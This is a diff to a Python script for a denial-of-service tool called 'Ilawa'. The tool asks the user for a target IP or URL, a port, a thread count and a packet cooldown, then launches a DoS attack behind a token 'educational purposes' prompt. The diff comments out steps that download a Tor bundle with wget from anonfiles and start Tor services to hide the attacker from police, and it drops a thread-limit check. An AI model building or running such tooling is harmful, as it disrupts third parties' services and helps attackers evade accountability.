@@ -33,33 +33,29 @@ if phs == "IMSUCHADUMBGUYMYMOMDOPORNHUB": #if clausule
     import prepareTorServices #imports prepareTorServices.py, this module enables tor-service for attack lmao
 
     import os
-    print("Ilawa >> Downloading TOR Expert bundle, it will be used to hide u from ur mom and police... \n")
-    if os.path.exists("Tor.zip") is False:
-        os.system("wget https://cdn-132.anonfiles.com/n4u9veK0x0/98d58f6f-1645867289/Tor.zip") #TOR windows expert bundle on anonfiles
-        print("Ilawa >> Download probably done \n")
-        print("Ilawa >> Unziping... \n")
-        os.system("unzip Tor.zip \n") #unzips Tor.zip (downloaded file)
-        print("Ilawa >> Unzip probably done! \n")
-    elif os.path.exists("Tor"):
-        print("Ilawa >> Tor folder exists, skipping download procces...")
+    #print("Ilawa >> Downloading TOR Expert bundle, it will be used to hide u from ur mom and police... \n")
+    #if os.path.exists("Tor.zip") is False:
+    #    os.system("wget https://cdn-132.anonfiles.com/n4u9veK0x0/98d58f6f-1645867289/Tor.zip") #TOR windows expert bundle on anonfiles
+    #    print("Ilawa >> Download probably done \n")
+    #    print("Ilawa >> Unziping... \n")
+    #    os.system("unzip Tor.zip \n") #unzips Tor.zip (downloaded file)
+    #    print("Ilawa >> Unzip probably done! \n")
+    #elif os.path.exists("Tor"):
+    #    print("Ilawa >> Tor folder exists, skipping download procces...")
 
-    print("Ilawa >> Installing TorServices...")
-    prepareTorServices.installServices()
+    #print("Ilawa >> Installing TorServices...")
+    #prepareTorServices.installServices()
 
-    print("Ilawa >> Starting TorServices...")
-    prepareTorServices.startServices()
+    #print("Ilawa >> Starting TorServices...")
+    #prepareTorServices.startServices()
 
     print("Ilawa >> Now u have to put in some data!")
     ip = input("Put ur target ip/url")
     port = input("Put port that will be attacked")
     nawalki = input("Put number of threadads that will make attack (bigger number = better results) max 100")
-    if nawalki <= 100:
-        cooldown = input("Put cooldown time in miliseconds (cooldown before sending next package) deafult: 1")
-        userAgent = input("User-agent string that will be send in every single package deafult: ukraini slava")
+    cooldown = input("Put cooldown time in miliseconds (cooldown before sending next package) deafult: 1")
+    userAgent = input("User-agent string that will be send in every single package deafult: ukraini slava")
         
-    else:
-        print("U can't put more than 100 threads, ur pc will go kaboom")
-
     if ip is not None and port is not None and nawalki is not None and cooldown is not None:
         print("Ilawa >> All the data has been put \n")
         print("Are u sure that u want make DoS attack ONLY for educational purposes? [Y/n]")
